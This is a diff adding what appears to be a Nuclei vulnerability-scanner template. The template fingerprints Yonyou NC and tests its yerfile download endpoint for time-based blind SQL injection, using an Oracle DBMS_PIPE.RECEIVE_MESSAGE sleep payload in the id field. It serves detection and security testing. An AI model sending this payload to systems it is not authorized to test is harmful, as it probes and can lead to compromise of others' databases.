@@ -1,0 +1,42 @@
+id: poc-yaml-yongyou-nc-yerfile-sqli
+info:
+  name: Yonyou NC Yerfile SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection, yonyou-nc
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Yonyou NC"
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/portal/pt/yerfile/down/bill?pageId=login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{{t1}})--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "error"
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
